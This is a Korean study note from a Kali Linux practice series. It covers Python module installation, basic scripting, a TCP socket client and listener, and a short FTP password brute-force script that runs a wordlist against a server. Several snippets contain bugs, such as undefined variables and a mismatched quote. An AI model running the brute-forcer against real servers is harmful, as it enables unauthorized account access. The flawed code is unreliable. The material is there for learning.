# 칼리 리눅스 실습 17

 - 기본적인 스크립트 작성을 만들 줄 알아야함.(남이 만든것만 쓰면 안됨.)
 - sqlmap,scapy,SET(social-engineer toolkit),w3af등 인기있는 해커 도구는 대부분 파이썬 스크립트로 만들어졌다.
 - 이번에는 라이브러리가 많은 파이썬을 가지고 스크립트를 만든다.

## 파이썬 모듈 추가
 - 파이썬을 설치할 때 광범위한 기능을 제공하는 표준 라이브러리 및 모듈 모음도 설치한다.
 - 이런 표준 라이브러리,모듈 + 서드 파티 모듈이 광범위하기 때문에 자주 쓴다.(https://www.pypi.org/ 에서 찾을 수 있다.)
 - pip(pip installs packages)라는 파이썬 패키지를 설치하고 관리하기 위한 패키지 관리자가 파이썬에 있다.
 - 여기에서는 파이썬 3으로 작업할 것이니 파이썬 3용 pip가 필요하다. sudo apt-get install python3-pip로 설치할 수 있다.
 - 이제 pip3 install [패키지명]으로 패키지를 다운로드하면 자동으로 /usr/local/lib/python3.6/pysnmp에서 찾을 수 있다.
 - pip3 show [패키지명]으로 패키지가 있는 디렉터리 정보를 포함하여 패키지에 대한 많은 정보를 제공하기도 한다.
 - 서드 파티 모듈 설치를 위해서는 wget 명령으로 온라인으로 저장되는 모든 위치에서 다운로드하고 모듈 압축을 푼 다음 python setup.py install 명령을 실행할 수 있다.
 1. 먼저 xael.org에서 모듈을 다운로드 한다.
 ex) wget https://xael.org/pages/python-nmap-0.7.1.tar.gz
 2. 압축을 푼다. tar -xzf python-nmap-0.7.1.tar.gz
 3. 디렉터리를 새로 생성된 디렉터리로 변경한다. cd python-nmap-0.7.1
 4. 해당 디렉터리에 새 모듈을 설치한다. python setup.py install (현재는 권장되지 않는 명령어)

## 파이썬 스크립트 작성
 - hackers-arise_greetings.py를 작성하고 편집기로 실행한다.
 ```
 #! /usr/bin/python3
 name="OccupyTheWeb"
 print("Greetings to " + name + " from Hackers. the best place to learn.")
 ```
 - 이제 chmod 755 hackers-arise_greetings.py로 실행 권한을 부여하고 ./hackers-arise_greetings.py로 실행한다.
 ``` study.py
 #! /usr/bin/python3
 a = "strings"
 b = 2
 c = 3.1415
 d = [1,2,3,4,5,6]
 for i in range(6):
     print(d[i])
 dict = {'name':'bin','value':27}
 print(dict[name])
```
 - 얘도 권한 755로 바꾸고 ./로 실행해주면 잘 실행된다.
 - 주석은 # 나 """ 중간 말 """로 한다.
 - 함수는 정말 많지만 간단히 살펴보면 exit(),float(),help(),int(),len(),max(),open(),range(),sorted(),type()등이 있다.
 - 정의하고 싶다면 def a(매개변수들):으로 정의하면 된다.
 - 반복문은 for i in range(5):,while (cnt<=10): 처럼 쓰며 true,false는 True,False처럼 대문자로 쓴다.
 - if else 구문은 if user_id==10:처럼 괄호 없이 쓴다.

 - 모듈은 단순히 별도의 파일에 저장된 코드 부분이므로 다시 입력할 필요 없이 프로그램에서 필요한 만큼 사용할 수 있다.
 - nmap을 쓰고 싶다면 nmap 모듈을 위에서 처럼 다운로드하고 import nmap을 하면 된다.

### 파이썬에서의 네트워크 통신
 1. tcp 클라이언트 제작 (socket 모듈 이용)
 - touch client.py
 ```
 #! /usr/bin/python3
 import socket
 s = socket.socket() # 소켓 객체 생성
 s.connect(("127.0.0.1",22)) # 특정 ip로 연결
 answer = s.recv(1024) # 1024바이트 데이터를 읽어서 answer에 저장
 print(answer)
 s.close()
 ```
 - chmod 755 client.py

 2. tcp 리스너 제작
 - 이 소소
 - touch server.py
 ```
 #! /usr/bin/python3
 import socket

 TCP_IP = "192.168.181.190"
 TCP_PORT = 6996
 BUFFER_SIZE = 100
 s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
 s.bind((TCP_IP,TCP_PORT))
 s.listen(1)
 conn,maddr = s.accept()
 print('connection address: ',addr)
 while True:
     data=conn.recv(BUFFER_SIZE)
     if not data:
         break;
     print("Received date: ",data)
     conn.send(data)
 conn.close()
 ```
 - chmod 755 server.py
 - 이 스크립트를 사용하면 특정 IP 주소와 포트에서 실행 중인 곳에 연결을 요청해 특정 IP 포트가 열려있는지,응답 메시지로 애플리케이션, 버전, 운영체제가 무엇인지 알 수 있다.

## 예외 및 비밀번호 크래커
```
#! /usr/bin/python3
import ftplib
server = input("FTP Server: ")
user = input("username: ")
PasswordList = input("Path to Password List > ")
try:
    with open(PasswordList,'r') as pw:
        for word in pw:
            word = word.strip('\r\n')
            try:
                ftp = ftplib.FTP(server)
                ftp.login(user,word)
                print("Success! the password is " 
                + word)
            except ftplib.error_perm as exc:
                print('still trying...',exc)
except Exception as exc:
    print('Wordlist error ",exc)
```
 - FTP 프로토콜을 위해 ftplib 모듈에서 도구를 이용한다.
 - FTP 서버의 IP 주소, 사용자명을 입력하고 비밀번호 목록을 위한 값을 넣는다.
 - 그러면 이제 strip()으로 비밀번호들만 남기고 비밀번호 목록으로 로그인을 시도한다.
 - 만약 비밀번호 입력이 힘들다면 bigpasswordlist.txt를 만들고 입력으로 txt파일을 넣을 수도 있다.

